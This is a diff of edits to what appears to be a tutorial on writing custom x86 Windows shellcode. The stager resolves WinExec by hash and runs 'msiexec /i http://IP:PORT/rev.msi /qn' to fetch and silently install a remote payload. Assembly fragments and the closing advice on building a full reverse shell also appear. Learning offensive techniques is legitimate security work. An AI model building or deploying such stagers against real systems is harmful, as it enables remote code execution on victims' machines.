@@ -26,7 +26,7 @@ At a high-level overview, our payload will do the following:
 2. resolve functions like `WinExec()` or `TerminateProcess()` by hash.
 3. build the command string like `"msiexec /i http://IP:PORT/rev.msi /qn"` on the stack.
 4. call `WinExec()` with that command.
-5. exit the current thread gracefully with `TerminateProcess()`.
+5. exit the current process gracefully with `TerminateProcess()`.
 
 Let's go into detail, step by step.
 
@@ -361,7 +361,7 @@ Now we resolve the functions we actually want, using the resolver plus the ror13
 resolve_symbols:
     push 0x0E8AFE98                 ; ror13 hash of "WinExec"
     call dword ptr [ebp - 0x08]     ; find_function
-    mov  [ebp - 0x0C], eax          ; save WinExec
+    mov  [ebp - 0x10], eax          ; save WinExec
 ```
 
 
@@ -410,7 +410,7 @@ xor eax, eax        ; zero eax first: remember the warning above!
 mov al, 0x64        ; bottom byte of eax = 'd'
 push eax            ; 'd' + three null bytes (terminator included)
 mov ax, 0x6d63      ; bottom two bytes = `63 6d` = "cm"
-push ax             ; pushed at a **lower** address
+push ax             ; pushed at a lower address
 ```
 
 Final layout:
@@ -488,6 +488,7 @@ What a journey! This is our final script, using [keystone](https://github.com/ke
 #!/usr/bin/python3
 import argparse
 import ctypes
+import struct
 import numpy
 import keystone as ks
 
@@ -743,7 +744,7 @@ OMG! It's alive! 🧟‍♂️
 
 ## bottom line
 
-That's pretty much it. We built a full position-independent stager from scratch. In some contexts, knowing what's under the hood is helpful, because your friend msfvenom won't work in every situation. Running shellcode vs. understanding it can makes the difference.
+That's pretty much it. We built a full position-independent stager from scratch. In some contexts, knowing what's under the hood is helpful, because your friend msfvenom won't work in every situation. Running shellcode vs. understanding it can make the difference.
 
 What if you want a full revshell custom shellcode, not a stager? Well, you'd reach for `WSAConnect()`, `CreateProcessA()`, and friends. My priority in this article was to explore how to do the basic stuff. With this baseline, you can adapt it to other contexts[^5]: you now know how to load dlls, find functions, load their addresses, push args, call them dynamically, etc.
 
